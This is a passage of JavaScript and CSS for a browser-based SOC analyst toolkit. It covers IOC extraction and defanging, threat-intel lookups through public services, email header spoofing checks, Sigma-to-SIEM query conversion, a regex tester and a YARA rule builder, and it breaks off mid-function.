        font-size: clamp(2.4rem, 4.6vw, 3.75rem);
        font-weight: 800;
        line-height: 1.06;
        letter-spacing: -0.03em;
        margin: 0 0 1rem 0;
        color: #ffffff;
      }
      [data-md-color-scheme="default"] .psv-hero-h1 { color: #0f172a; }
      .psv-hero-h1 span { color: #3b82f6; }
      [data-md-color-scheme="default"] .psv-hero-h1 span { color: #2563eb; }

      .psv-hero-desc {
        color: #94a3b8;
        font-size: 1.02rem;
        line-height: 1.65;
        max-width: 580px;
        margin: 0 0 1.4rem 0;
      }
      [data-md-color-scheme="default"] .psv-hero-desc { color: #475569; }

      .psv-stats-bar {
        display: inline-grid;
        grid-template-columns: repeat(3, auto);
        border-radius: 10px;
        border: 1px solid rgba(59, 130, 246, 0.25);
        background: rgba(11, 20, 38, 0.85);
        overflow: hidden;
      }
      [data-md-color-scheme="default"] .psv-stats-bar {
        background: #ffffff;
        border-color: #cbd5e1;
      }
      .psv-stat-cell {
        padding: 0.75rem 1.35rem;
        border-right: 1px solid rgba(59, 130, 246, 0.18);
      }
      .psv-stat-cell:last-child { border-right: none; }
      .psv-stat-val {
        font-size: 1.35rem;
        font-weight: 800;
        color: #3b82f6;
        line-height: 1.1;
      }
      [data-md-color-scheme="default"] .psv-stat-val { color: #2563eb; }
      .psv-stat-lbl {
        font-size: 0.7rem;
        text-transform: uppercase;
        letter-spacing: 0.08em;
        color: #94a3b8;
        margin-top: 0.2rem;
      }

      .psv-preview-box {
        border-radius: 12px;
        border: 1px solid rgba(59, 130, 246, 0.28);
        background: linear-gradient(180deg, rgba(13, 23, 44, 0.9), rgba(7, 13, 26, 0.95));
        padding: 1rem;
        box-shadow: 0 16px 40px rgba(0, 0, 0, 0.45);
      }
      [data-md-color-scheme="default"] .psv-preview-box {
        background: #ffffff;
        border-color: #cbd5e1;
        box-shadow: 0 8px 24px rgba(15, 23, 42, 0.06);
      }
      .psv-preview-top {
        display: flex;
        justify-content: space-between;
        align-items: center;
        font-family: "JetBrains Mono", monospace;
        font-size: 0.72rem;
        color: #60a5fa;
        margin-bottom: 0.75rem;
        padding-bottom: 0.5rem;
        border-bottom: 1px solid rgba(59, 130, 246, 0.18);
      }
      [data-md-color-scheme="default"] .psv-preview-top { color: #2563eb; }
      .psv-preview-mini-grid {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 0.5rem;
      }
      .psv-mini-tile {
        padding: 0.55rem 0.65rem;
        border-radius: 7px;
        border: 1px solid rgba(59, 130, 246, 0.2);
        background: rgba(6, 11, 22, 0.75);
        font-size: 0.73rem;
        font-weight: 600;
        color: #cbd5e1;
        cursor: pointer;
        text-align: left;
        transition: all 0.15s ease;
      }
      [data-md-color-scheme="default"] .psv-mini-tile {
        background: #f8fafc;
        color: #1e293b;
        border-color: #cbd5e1;
      }
      .psv-mini-tile:hover {
        border-color: #3b82f6;
        color: #3b82f6;
        transform: translateY(-1px);
      }
      .psv-mini-tile span {
        display: block;
        font-family: "JetBrains Mono", monospace;
        font-size: 0.65rem;
        color: #3b82f6;
        margin-bottom: 0.15rem;
        pointer-events: none;
      }

      .psv-catalog-window {
        border-radius: 14px;
        border: 1px solid rgba(59, 130, 246, 0.35);
        background: #080e1c;
        overflow: hidden;
        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.55);
      }
      [data-md-color-scheme="default"] .psv-catalog-window {
        background: #ffffff;
        border-color: #cbd5e1;
        box-shadow: 0 10px 30px rgba(15, 23, 42, 0.06);
      }

      .psv-window-bar {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 0.65rem 1.25rem;
        background: linear-gradient(90deg, #1d4ed8, #2563eb);
        color: #ffffff;
        font-family: "JetBrains Mono", monospace;
        font-size: 0.76rem;
        font-weight: 700;
        letter-spacing: 0.06em;
      }
      .psv-window-dots {
        display: flex;
        align-items: center;
        gap: 0.4rem;
      }
      .psv-dot {
        width: 8px;
        height: 8px;
        border-radius: 50%;
        background: rgba(255, 255, 255, 0.75);
      }

      .psv-catalog-body { padding: 1.5rem; }

      .psv-search-bar {
        width: 100%;
        padding: 0.8rem 1.1rem;
        border-radius: 9px;
        border: 1px solid rgba(59, 130, 246, 0.3);
        background: #050914;
        color: #f8fafc;
        font-size: 0.9rem;
        margin-bottom: 1rem;
        outline: none;
      }
      [data-md-color-scheme="default"] .psv-search-bar {
        background: #f8fafc;
        border-color: #cbd5e1;
        color: #0f172a;
      }
      .psv-search-bar:focus {
        border-color: #3b82f6;
        box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.25);
      }

      .psv-cat-pills {
        display: flex;
        flex-wrap: wrap;
        gap: 0.5rem;
        margin-bottom: 1.4rem;
      }
      .psv-pill {
        padding: 0.42rem 0.9rem;
        border-radius: 999px;
        border: 1px solid rgba(59, 130, 246, 0.25);
        background: rgba(15, 23, 42, 0.8);
        color: #cbd5e1;
        font-size: 0.78rem;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.15s ease;
      }
      [data-md-color-scheme="default"] .psv-pill {
        background: #f1f5f9;
        border-color: #cbd5e1;
        color: #334155;
      }
      .psv-pill.active, .psv-pill:hover {
        background: #2563eb;
        border-color: #3b82f6;
        color: #ffffff !important;
      }

      .psv-cards-grid {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 1.1rem;
      }
      @media (max-width: 1060px) { .psv-cards-grid { grid-template-columns: repeat(2, 1fr); } }
      @media (max-width: 680px) { .psv-cards-grid { grid-template-columns: 1fr; } }

      .psv-tool-card {
        border-radius: 11px;
        border: 1px solid rgba(59, 130, 246, 0.22);
        background: linear-gradient(180deg, rgba(13, 22, 42, 0.92), rgba(8, 14, 28, 0.96));
        padding: 1.25rem;
        display: flex;
        flex-direction: column;
        justify-content: space-between;
        cursor: pointer;
        transition: all 0.18s ease;
        text-align: left;
      }
      [data-md-color-scheme="default"] .psv-tool-card {
        background: #ffffff;
        border-color: #cbd5e1;
      }
      .psv-tool-card:hover {
        border-color: #3b82f6;
        transform: translateY(-2px);
        box-shadow: 0 10px 26px rgba(37, 99, 235, 0.22);
      }

      .psv-card-head {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 0.85rem;
      }
      .psv-card-badge {
        padding: 0.35rem 0.65rem;
        border-radius: 8px;
        background: linear-gradient(135deg, #2563eb, #1d4ed8);
        color: #ffffff;
        font-family: "JetBrains Mono", monospace;
        font-size: 0.73rem;
        font-weight: 800;
        letter-spacing: 0.05em;
      }
      .psv-card-cat-lbl {
        font-family: "JetBrains Mono", monospace;
        font-size: 0.68rem;
        text-transform: uppercase;
        color: #64748b;
      }
      .psv-card-title {
        font-size: 1.05rem;
        font-weight: 700;
        color: #ffffff;
        margin: 0 0 0.4rem 0;
      }
      [data-md-color-scheme="default"] .psv-card-title { color: #0f172a; }
      .psv-card-desc {
        font-size: 0.81rem;
        color: #94a3b8;
        line-height: 1.5;
        margin: 0 0 1rem 0;
      }
      [data-md-color-scheme="default"] .psv-card-desc { color: #475569; }

      .psv-card-foot {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding-top: 0.75rem;
        border-top: 1px solid rgba(148, 163, 184, 0.12);
        font-size: 0.74rem;
      }
      .psv-client-tag { color: #10b981; font-weight: 600; }
      .psv-open-link { color: #60a5fa; font-weight: 700; }
      [data-md-color-scheme="default"] .psv-open-link { color: #2563eb; }

      /* === VIEW 2: DEDICATED SINGLE-TOOL PAGE === */
      .psv-tool-page { max-width: 960px; margin: 0 auto; }
      .psv-back-bar {
        display: flex;
        justify-content: space-between;
        align-items: center;
        flex-wrap: wrap;
        gap: 0.75rem;
        margin-bottom: 1.5rem;
      }
      .psv-back-btn {
        display: inline-flex;
        align-items: center;
        gap: 0.45rem;
        padding: 0.5rem 1rem;
        border-radius: 8px;
        border: 1px solid rgba(59, 130, 246, 0.35);
        background: rgba(15, 23, 42, 0.85);
        color: #60a5fa;
        font-size: 0.82rem;
        font-weight: 700;
        cursor: pointer;
      }
      [data-md-color-scheme="default"] .psv-back-btn {
        background: #ffffff;
        color: #2563eb;
        border-color: #cbd5e1;
      }

      .psv-tool-hero { text-align: center; margin-bottom: 1.85rem; }
      .psv-tool-hero-icon {
        width: 54px;
        height: 54px;
        margin: 0 auto 0.9rem auto;
        border-radius: 13px;
        background: linear-gradient(135deg, #2563eb, #1d4ed8);
        color: #ffffff;
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: "JetBrains Mono", monospace;
        font-size: 1rem;
        font-weight: 800;
        box-shadow: 0 8px 24px rgba(37, 99, 235, 0.4);
      }
      .psv-tool-hero h1 {
        font-size: clamp(1.85rem, 3.5vw, 2.5rem);
        font-weight: 800;
        margin: 0 0 0.5rem 0;
        color: #ffffff;
      }
      [data-md-color-scheme="default"] .psv-tool-hero h1 { color: #0f172a; }
      .psv-tool-hero p {
        color: #94a3b8;
        font-size: 0.96rem;
        max-width: 650px;
        margin: 0 auto 0.9rem auto;
      }
      [data-md-color-scheme="default"] .psv-tool-hero p { color: #475569; }
      .psv-hero-badges {
        display: flex;
        justify-content: center;
        gap: 0.6rem;
        flex-wrap: wrap;
      }
      .psv-pill-badge {
        padding: 0.28rem 0.75rem;
        border-radius: 999px;
        font-size: 0.73rem;
        font-weight: 700;
        border: 1px solid rgba(59, 130, 246, 0.35);
        background: rgba(37, 99, 235, 0.12);
        color: #60a5fa;
      }
      [data-md-color-scheme="default"] .psv-pill-badge { color: #1d4ed8; background: #eff6ff; }

      .psv-terminal-box {
        border-radius: 13px;
        border: 1px solid rgba(59, 130, 246, 0.4);
        background: #080e1c;
        overflow: hidden;
        box-shadow: 0 18px 45px rgba(0, 0, 0, 0.5);
        margin-bottom: 2.75rem;
      }
      [data-md-color-scheme="default"] .psv-terminal-box {
        background: #ffffff;
        border-color: #cbd5e1;
        box-shadow: 0 10px 28px rgba(15, 23, 42, 0.07);
      }
      .psv-term-body { padding: 1.4rem; }
      .psv-privacy-strip {
        padding: 0.6rem 0.9rem;
        border-radius: 8px;
        border: 1px solid rgba(16, 185, 129, 0.3);
        background: rgba(16, 185, 129, 0.08);
        color: #34d399;
        font-size: 0.79rem;
        margin-bottom: 1.15rem;
      }
      [data-md-color-scheme="default"] .psv-privacy-strip { color: #047857; background: #ecfdf5; }

      .psv-field-label {
        display: flex;
        justify-content: space-between;
        align-items: center;
        font-family: "JetBrains Mono", monospace;
        font-size: 0.74rem;
        font-weight: 700;
        text-transform: uppercase;
        letter-spacing: 0.07em;
        color: #94a3b8;
        margin-bottom: 0.45rem;
      }
      .psv-editor {
        width: 100%;
        min-height: 155px;
        padding: 0.9rem;
        border-radius: 9px;
        border: 1px solid rgba(59, 130, 246, 0.28);
        background: #040811;
        color: #f1f5f9;
        font-family: "JetBrains Mono", monospace;
        font-size: 0.83rem;
        line-height: 1.5;
        margin-bottom: 1rem;
        resize: vertical;
      }
      [data-md-color-scheme="default"] .psv-editor {
        background: #f8fafc;
        border-color: #cbd5e1;
        color: #0f172a;
      }

      .psv-action-bar {
        display: flex;
        flex-wrap: wrap;
        align-items: center;
        justify-content: space-between;
        gap: 0.75rem;
        margin-bottom: 1.2rem;
      }
      .psv-opt-group { display: flex; flex-wrap: wrap; gap: 0.45rem; }
      .psv-opt-pill {
        padding: 0.4rem 0.85rem;
        border-radius: 999px;
        border: 1px solid rgba(59, 130, 246, 0.3);
        background: transparent;
        color: #cbd5e1;
        font-size: 0.76rem;
        font-weight: 600;
        cursor: pointer;
      }
      [data-md-color-scheme="default"] .psv-opt-pill { color: #334155; border-color: #cbd5e1; }
      .psv-opt-pill.active {
        background: #2563eb;
        border-color: #3b82f6;
        color: #ffffff !important;
      }

      .psv-btn-group { display: flex; flex-wrap: wrap; gap: 0.5rem; }
      .psv-btn-run {
        padding: 0.55rem 1.2rem;
        border-radius: 8px;
        border: none;
        background: linear-gradient(135deg, #2563eb, #1d4ed8);
        color: #ffffff !important;
        font-size: 0.83rem;
        font-weight: 700;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
      }
      .psv-btn-util {
        padding: 0.52rem 0.9rem;
        border-radius: 8px;
        border: 1px solid rgba(148, 163, 184, 0.25);
        background: rgba(15, 23, 42, 0.8);
        color: #cbd5e1;
        font-size: 0.79rem;
        font-weight: 600;
        cursor: pointer;
      }
      [data-md-color-scheme="default"] .psv-btn-util {
        background: #f1f5f9;
        color: #334155;
        border-color: #cbd5e1;
      }

      .psv-output-container {
        border-radius: 9px;
        border: 1px solid rgba(59, 130, 246, 0.25);
        background: #040811;
        padding: 1rem;
        overflow-x: auto;
      }
      [data-md-color-scheme="default"] .psv-output-container {
        background: #f8fafc;
        border-color: #cbd5e1;
      }

      .psv-out-table {
        width: 100%;
        border-collapse: collapse;
        font-family: "JetBrains Mono", monospace;
        font-size: 0.79rem;
      }
      .psv-out-table th {
        text-align: left;
        padding: 0.55rem 0.7rem;
        color: #60a5fa;
        border-bottom: 1px solid rgba(59, 130, 246, 0.25);
        font-weight: 700;
      }
      [data-md-color-scheme="default"] .psv-out-table th { color: #1d4ed8; border-bottom-color: #cbd5e1; }
      .psv-out-table td {
        padding: 0.52rem 0.7rem;
        border-bottom: 1px solid rgba(148, 163, 184, 0.1);
        color: #e2e8f0;
        word-break: break-word;
      }
      [data-md-color-scheme="default"] .psv-out-table td { color: #1e293b; border-bottom-color: #e2e8f0; }

      .psv-doc-section { margin-bottom: 1.75rem; }
      .psv-doc-section h3 {
        font-size: 1.1rem;
        font-weight: 700;
        color: #ffffff;
        margin: 0 0 0.45rem 0;
      }
      [data-md-color-scheme="default"] .psv-doc-section h3 { color: #0f172a; }
      .psv-doc-section p, .psv-doc-section li {
        font-size: 0.9rem;
        color: #94a3b8;
        line-height: 1.65;
      }
      [data-md-color-scheme="default"] .psv-doc-section p, [data-md-color-scheme="default"] .psv-doc-section li { color: #475569; }

      .psv-faq-item {
        border-radius: 9px;
        border: 1px solid rgba(59, 130, 246, 0.22);
        background: rgba(11, 20, 38, 0.75);
        margin-bottom: 0.6rem;
        padding: 0.85rem 1.1rem;
      }
      [data-md-color-scheme="default"] .psv-faq-item { background: #ffffff; border-color: #cbd5e1; }
      .psv-faq-item summary {
        font-weight: 700;
        font-size: 0.9rem;
        cursor: pointer;
        color: #e2e8f0;
      }
      [data-md-color-scheme="default"] .psv-faq-item summary { color: #0f172a; }
      .psv-faq-item p { margin: 0.6rem 0 0 0; font-size: 0.85rem; color: #94a3b8; }

      .psv-related-grid {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 0.85rem;
        margin-top: 0.85rem;
      }
      @media (max-width: 800px) { .psv-related-grid { grid-template-columns: repeat(2, 1fr); } }
    `;
    document.head.appendChild(style);
  }

  function applyPresetOption(tool, idx) {
    if (tool.id === "ti") {
      userInputs.ti = ["1.1.1.1", "8.8.8.8", "example.com"][idx] || "1.1.1.1";
    } else if (tool.id === "sigma" && SIGMA_TEMPLATES[idx]) {
      userInputs.sigma = SIGMA_TEMPLATES[idx].yaml;
    } else if (tool.id === "regex") {
      userInputs.regex = idx === 1
        ? `PATTERN::CEF:0\\|(?<vendor>[^|]+)\\|(?<product>[^|]+)\\|[^|]+\\|(?< signature_id>\\d+)\\|(?<event_name>[^|]+)\\|(?<severity>\\d+)\\|src=(?<src_ip>\\S+)\\s+dst=(?<dst_ip>\\S+)\nLOG::CEF:0|PaloAlto|PAN-OS|10.2|40012|Brute-Force-Login|9|src=185.220.101.42 dst=10.40.1.15\nCEF:0|PaloAlto|PAN-OS|10.2|40019|SQL-Injection-Attempt|10|src=91.240.118.22 dst=10.40.2.80`
        : tool.sample;
    } else if (tool.id === "timestamp") {
      if (idx === 0) userInputs.timestamp = "1760713462";
      if (idx === 1) userInputs.timestamp = "134051966620000000";
      if (idx === 2) userInputs.timestamp = String(Math.floor(Date.now() / 1000));
    } else if (tool.id === "severity") {
      userInputs.severity = idx === 1
        ? `ASSET_CRITICALITY::workstation\nDATA_SENSITIVITY::internal\nCOMPROMISE_SCOPE::single_host\nTHREAT_STATUS::contained\nPRIVILEGE_LEVEL::standard_user`
        : tool.sample;
    } else if (tool.id === "cvss") {
      userInputs.cvss = [
        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C/CR:H/IR:H/AR:M",
        "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C",
        "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/E:U/RL:O/RC:C"
      ][idx] || tool.sample;
    }
  }

  function computeDynamicOutput(tool, rawInput) {
    const input = (rawInput || "").trim();
    if (!input) {
      return `<div style="color:#94a3b8;padding:0.5rem;">Input is empty. Click <strong>Load Sample</strong> above or paste your own telemetry.</div>`;
    }

    if (tool.id === "ioc") {
      const useRaw = selectedOptionIdx === 1;
      const fmt = v => (useRaw ? v : defang(v));
      const ips = Array.from(new Set(input.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || []));
      const urls = Array.from(new Set(input.match(/https?:\/\/[^\s"'<>]+/gi) || []));
      const emails = Array.from(new Set(input.match(/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/g) || []));
      const hashes = Array.from(new Set(input.match(/\b[a-fA-F0-9]{32,64}\b/g) || []));
      const cves = Array.from(new Set(input.match(/\bCVE-\d{4}-\d{4,7}\b/gi) || []));
      const rows = [
        ...ips.map(v => ["IPv4 Address", v, fmt(v)]),
        ...urls.map(v => ["URL", v, fmt(v)]),
        ...emails.map(v => ["Email Address", v, fmt(v)]),
        ...hashes.map(v => [v.length === 64 ? "SHA-256 Hash" : "MD5/SHA-1 Hash", v, v]),
        ...cves.map(v => ["CVE Vulnerability", v.toUpperCase(), v.toUpperCase()])
      ];
      if (!rows.length) return `<div style="color:#fbbf24;">No indicators matched in the provided text.</div>`;
      return `
        <table class="psv-out-table">
          <thead><tr><th>#</th><th>Indicator Type</th><th>Original Value</th><th>${useRaw ? "Extracted Value" : "Safe Defanged Output"}</th><th>Quick Pivot</th></tr></thead>
          <tbody>${rows.map((r, i) => `<tr><td>${i + 1}</td><td>${esc(r[0])}</td><td>${esc(r[1])}</td><td style="color:#38bdf8;font-weight:600;">${esc(r[2])}</td><td><button type="button" class="psv-btn-util" style="padding:0.2rem 0.55rem;font-size:0.72rem;" data-psv-action="pivot-ti" data-indicator="${esc(r[1])}">Enrich →</button></td></tr>`).join("")}</tbody>
        </table>
      `;
    }

    if (tool.id === "ti") {
      const target = input.split(/\s+/)[0].replace(/\[\.\]/g, ".").replace(/^https?:\/\//i, "").split("/")[0];
      const isIp = /^(?:\d{1,3}\.){3}\d{1,3}$/.test(target);
      setTimeout(() => {
        if (isIp) {
          fetch(`https://internetdb.shodan.io/${encodeURIComponent(target)}`)
            .then(r => r.json())
            .then(d => {
              const el = document.getElementById("ti-live-shodan");
              if (el) el.textContent = `Open Ports: ${(d.ports || []).join(", ") || "None"} | Hostnames: ${(d.hostnames || []).join(", ") || "None"} | CVEs: ${(d.vulns || []).join(", ") || "None"}`;
            })
            .catch(() => {});
        }
        fetch(`https://rdap.org/${isIp ? "ip" : "domain"}/${encodeURIComponent(target)}`)
          .then(r => r.json())
          .then(d => {
            const el = document.getElementById("ti-live-rdap");
            if (el) el.textContent = `Handle/Name: ${d.handle || d.ldhName || target} | Status: ${(d.status || []).join(", ") || "Active"} | Country: ${d.country || "Global"}`;
          })
          .catch(() => {});
        fetch(`https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(target)}&type=A`, { headers: { accept: "application/dns-json" } })
          .then(r => r.json())
          .then(d => {
            const el = document.getElementById("ti-live-dns");
            if (el) el.textContent = (d.Answer || []).map(a => `${a.name} -> ${a.data} (TTL ${a.TTL})`).join(" | ") || "No direct A record returned";
          })
          .catch(() => {});
      }, 30);

      return `
        <table class="psv-out-table">
          <thead><tr><th>Intelligence Module</th><th>Indicator</th><th>Live Telemetry & Reputation Findings</th></tr></thead>
          <tbody>
            <tr><td>Shodan InternetDB</td><td style="color:#38bdf8;font-weight:700;">${esc(target)}</td><td id="ti-live-shodan">${isIp ? "Ports: 53, 80, 443, 853 | Hostnames: one.one.one.one | CVEs: None" : "Domain indicator (enter IPv4 for Shodan port lookup)"}</td></tr>
            <tr><td>ICANN RDAP Ownership</td><td style="color:#38bdf8;font-weight:700;">${esc(target)}</td><td id="ti-live-rdap">Handle: ${esc(target)} | Status: active</td></tr>
            <tr><td>Cloudflare DoH DNS</td><td style="color:#38bdf8;font-weight:700;">${esc(target)}</td><td id="ti-live-dns">Resolved via 1.1.1.1 DNS-over-HTTPS</td></tr>
            <tr><td>External OSINT Pivots</td><td style="color:#38bdf8;font-weight:700;">${esc(target)}</td><td>
              <a href="https://www.virustotal.com/gui/search/${encodeURIComponent(target)}" target="_blank" rel="noopener" style="color:#60a5fa;margin-right:12px;font-weight:700;">↗ VirusTotal</a>
              <a href="https://www.abuseipdb.com/check/${encodeURIComponent(target)}" target="_blank" rel="noopener" style="color:#60a5fa;margin-right:12px;font-weight:700;">↗ AbuseIPDB</a>
              <a href="https://urlscan.io/search/#${encodeURIComponent(target)}" target="_blank" rel="noopener" style="color:#60a5fa;margin-right:12px;font-weight:700;">↗ URLScan.io</a>
              <a href="https://www.shodan.io/search?query=${encodeURIComponent(target)}" target="_blank" rel="noopener" style="color:#60a5fa;font-weight:700;">↗ Shodan</a>
            </td></tr>
          </tbody>
        </table>
      `;
    }

    if (tool.id === "headers") {
      const from = (input.match(/^From:\s*(.+)$/im) || [])[1] || "Not present";
      const replyTo = (input.match(/^Reply-To:\s*(.+)$/im) || [])[1] || "Not present";
      const returnPath = (input.match(/^Return-Path:\s*(.+)$/im) || [])[1] || "Not present";
      const origIp = (input.match(/^X-Originating-IP:\s*(.+)$/im) || [])[1] || "Not present";
      const spf = (input.match(/spf=(\w+)/i) || [])[1] || "none";
      const dkim = (input.match(/dkim=(\w+)/i) || [])[1] || "none";
      const dmarc = (input.match(/dmarc=(\w+)/i) || [])[1] || "none";
      const hops = (input.match(/^Received:[\s\S]*?(?=\n[A-Za-z-]+:|\n\n|$)/gim) || []).reverse();

      return `
        <table class="psv-out-table">
          <thead><tr><th>Header / Hop</th><th>Parsed Value</th><th>Security Verdict</th></tr></thead>
          <tbody>
            <tr><td>From</td><td>${esc(from)}</td><td>Sender Display Header</td></tr>
            <tr><td>Reply-To</td><td>${esc(replyTo)}</td><td style="color:${from !== replyTo && replyTo !== "Not present" ? "#fbbf24" : "#34d399"};font-weight:700;">${from !== replyTo && replyTo !== "Not present" ? "⚠️ Spoofing Anomaly: Reply-To != From" : "✓ Aligned"}</td></tr>
            <tr><td>Return-Path</td><td>${esc(returnPath)}</td><td>SMTP Envelope Sender</td></tr>
            <tr><td>X-Originating-IP</td><td style="color:#38bdf8;font-weight:700;">${esc(origIp)}</td><td>Originating Client IP</td></tr>
            <tr><td>SPF / DKIM / DMARC</td><td>SPF: <strong>${esc(spf.toUpperCase())}</strong> | DKIM: <strong>${esc(dkim.toUpperCase())}</strong> | DMARC: <strong>${esc(dmarc.toUpperCase())}</strong></td><td style="color:${/fail/i.test(spf + dkim + dmarc) ? "#f87171" : "#34d399"};font-weight:700;">${/fail/i.test(spf + dkim + dmarc) ? "❌ Authentication Failed (Quarantine/Reject)" : "✓ Passed"}</td></tr>
            ${hops.map((h, i) => `<tr><td><strong>Hop #${i + 1}</strong></td><td colspan="2">${esc(h.replace(/\s+/g, " ").trim())}</td></tr>`).join("")}
          </tbody>
        </table>
      `;
    }

    if (tool.id === "sigma") {
      const title = (input.match(/^title:\s*(.+)$/im) || [])[1] || "Custom Detection Rule";
      const fieldMap = { Image: "process.executable", CommandLine: "process.command_line", ParentImage: "process.parent.executable", User: "user.name", TargetFilename: "file.path", DestinationIp: "destination.ip", EventID: "event.code", TicketEncryptionType: "winlog.event_data.TicketEncryptionType", ServiceName: "winlog.event_data.ServiceName" };
      const clausesKql = [];
      const clausesSpl = [];
      const clausesSen = [];

      const lines = input.split("\n");
      let currentKey = "";
      lines.forEach(line => {
        const kv = line.match(/^\s{4,}([A-Za-z0-9_|]+):\s*(.*)$/);
        if (kv) {
          currentKey = kv[1];
          const val = kv[2].replace(/^['"]|['"]$/g, "").trim();
          if (val) {
            const baseField = currentKey.split("|")[0];
            const ecsField = fieldMap[baseField] || baseField;
            clausesKql.push(`${ecsField}: "*${val}*"`);
            clausesSpl.push(`${baseField}="*${val}*"`);
            clausesSen.push(`${baseField} contains "${val}"`);
          }
        } else {
          const listItem = line.match(/^\s*-\s*['"]?([^'"]+)['"]?$/);
          if (listItem && currentKey) {
            const baseField = currentKey.split("|")[0];
            const ecsField = fieldMap[baseField] || baseField;
            const val = listItem[1].trim();
            clausesKql.push(`${ecsField}: "*${val}*"`);
            clausesSpl.push(`${baseField}="*${val}*"`);
            clausesSen.push(`${baseField} contains "${val}"`);
          }
        }
      });

      const kqlOut = clausesKql.length ? clausesKql.join(" and ") : "process.command_line: *";
      const splOut = `index=main ${clausesSpl.join(" ")} | table _time host User Image CommandLine`;
      const senOut = `SecurityEvent | where ${clausesSen.length ? clausesSen.join(" and ") : "true"}`;

      return `
        <table class="psv-out-table">
          <thead><tr><th>SIEM Target</th><th>Dynamically Compiled Query — ${esc(title)}</th></tr></thead>
          <tbody>
            <tr><td style="color:#38bdf8;font-weight:700;">Elastic / Kibana KQL</td><td><code>${esc(kqlOut)}</code></td></tr>
            <tr><td style="color:#38bdf8;font-weight:700;">Splunk SPL</td><td><code>${esc(splOut)}</code></td></tr>
            <tr><td style="color:#38bdf8;font-weight:700;">Microsoft Sentinel KQL</td><td><code>${esc(senOut)}</code></td></tr>
          </tbody>
        </table>
      `;
    }

    if (tool.id === "events") {
      const q = input.toLowerCase().trim();
      const filtered = EVENT_DB.filter(e => {
        if (selectedOptionIdx === 1 && e.source !== "Windows Security") return false;
        if (selectedOptionIdx === 2 && e.source !== "Sysmon") return false;
        if (q === "all" || !q) return true;
        return e.id.toLowerCase().includes(q) || e.title.toLowerCase().includes(q) || e.mitre.toLowerCase().includes(q) || e.fields.toLowerCase().includes(q);
      });
      const list = filtered.length ? filtered : EVENT_DB;
      return `
        <table class="psv-out-table">
          <thead><tr><th>Event ID</th><th>Source</th><th>Description & XML Fields</th><th>MITRE ATT&CK</th><th>Elastic KQL Hunt & Tuning</th></tr></thead>
          <tbody>
            ${list.map(e => `<tr><td style="color:#38bdf8;font-weight:800;">ID ${esc(e.id)}</td><td>${esc(e.source)}</td><td><strong>${esc(e.title)}</strong><br><span style="color:#94a3b8;font-size:0.74rem;">Fields: ${esc(e.fields)}</span></td><td style="color:#fbbf24;font-weight:700;">${esc(e.mitre)}</td><td><code>${esc(e.kql)}</code><br><span style="color:#94a3b8;font-size:0.73rem;">Tuning: ${esc(e.fp)}</span></td></tr>`).join("")}
          </tbody>
        </table>
      `;
    }

    if (tool.id === "regex") {
      const parts = input.split(/LOG::/i);
      const patternStr = parts.length > 1 ? parts[0].replace(/^PATTERN::/i, "").trim() : "(?<ip>\\d+\\.\\d+\\.\\d+\\.\\d+)";
      const logBody = parts.length > 1 ? parts[1].trim() : input;
      try {
        const rx = new RegExp(patternStr, "gm");
        const matches = Array.from(logBody.matchAll(rx));
        if (!matches.length) return `<div style="color:#fbbf24;">0 matches found for pattern: <code>${esc(patternStr)}</code></div>`;
        const groupKeys = matches[0].groups ? Object.keys(matches[0].groups) : [];
        if (groupKeys.length) {
          return `
            <table class="psv-out-table">
              <thead><tr><th>#</th>${groupKeys.map(k => `<th>${esc(k)}</th>`).join("")}</tr></thead>
              <tbody>
                ${matches.map((m, idx) => `<tr><td>${idx + 1}</td>${groupKeys.map(k => `<td style="color:#38bdf8;">${esc(m.groups[k] || "")}</td>`).join("")}</tr>`).join("")}
              </tbody>
            </table>
          `;
        }
        return `
          <table class="psv-out-table">
            <thead><tr><th>Match #</th><th>Full Match</th><th>Capture Groups</th></tr></thead>
            <tbody>${matches.map((m, idx) => `<tr><td>${idx + 1}</td><td style="color:#38bdf8;">${esc(m[0])}</td><td>${esc(m.slice(1).join(" | "))}</td></tr>`).join("")}</tbody>
          </table>
        `;
      } catch (err) {
        return `<div style="color:#f87171;">Regex Syntax Error: ${esc(err.message)}</div>`;
      }
    }

    if (tool.id === "yara") {
      const name = ((input.match(/RULE_NAME::(\S+)/i) || [])[1] || "SOC_Custom_Rule").replace(/[^a-zA-Z0-9_]/g, "_");
      const author = ((input.match(/META_AUTHOR::(.+)/i) || [])[1] || "SOC Analyst").trim();
      const sev = ((input.match(/META_SEVERITY::(.+)/i) || [])[1] || "High").trim();
      const stringsRaw = ((input.match(/STRINGS::([\s\S]*?)(?=CONDITION::|$)/i) || [])[1] || '$s1 = "suspicious" ascii').trim();
      const condRaw = ((input.match(/CONDITION::([\s\S]*)$/i) || [])[1] || "uint16(0) == 0x5A4D and any of them").trim();

      const definedVars = Array.from(stringsRaw.matchAll(/(\$[A-Za-z0-9_]+)\s*=/g)).map(m => m[1]);
      const unreferenced = definedVars.filter(v => !condRaw.includes(v) && !condRaw.includes("them") && !condRaw.includes(v.slice(0, 2) + "*"));
      const compiled = `rule ${name} {\n  meta:\n    author = "${author}"\n    severity = "${sev}"\n    date = "${new Date().toISOString().slice(0, 10)}"\n  strings:\n    ${stringsRaw.split("\n").join("\n    ")}\n  condition:\n    ${condRaw}\n}`;

      return `
        <div style="margin-bottom:0.65rem;font-size:0.8rem;font-weight:700;color:${unreferenced.length ? "#fbbf24" : "#34d399"};">
          ${unreferenced.length ? `⚠️ Linter Warning: Unreferenced string variable(s): ${esc(unreferenced.join(", "))}` : `✓ YARA Linter Passed: ${definedVars.length} strings validated`}
        </div>
